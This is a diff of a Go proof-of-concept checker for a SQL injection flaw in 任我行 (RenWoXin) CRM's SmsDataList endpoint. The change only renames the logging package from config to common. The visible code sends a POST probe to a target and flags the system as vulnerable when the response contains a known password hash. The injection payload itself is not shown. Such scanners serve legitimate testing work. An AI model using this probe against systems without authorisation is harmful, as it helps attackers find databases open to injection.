@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/config"
+	"PocSir/common"
 	"bytes"
 	"crypto/tls"
 	"io"
@@ -32,7 +32,7 @@ func RenWoXin_Crm_Sql(target string) {
 
 	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(verifyPoc))
 	if err != nil {
-		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 
@@ -42,17 +42,17 @@ func RenWoXin_Crm_Sql(target string) {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		config.ErrMsg.Printf("[-]%s is timeout\n", target)
+		common.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp.Body.Close()
 
 	body, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "e10adc3949ba59abbe56e057f20f883e") {
-		config.Right.Printf("[+]存在任我行 CRM SmsDataList SQL注入漏洞\n")
-		config.TextPut.Printf(string(body) + "\n")
+		common.Right.Printf("[+]存在任我行 CRM SmsDataList SQL注入漏洞\n")
+		common.TextPut.Printf(string(body) + "\n")
 	} else {
-		config.ErrMsg.Printf("[-]不存在任我行 CRM SmsDataList SQL注入漏洞\n")
-		config.TextPut.Printf(string(body) + "\n")
+		common.ErrMsg.Printf("[-]不存在任我行 CRM SmsDataList SQL注入漏洞\n")
+		common.TextPut.Printf(string(body) + "\n")
 	}
 }
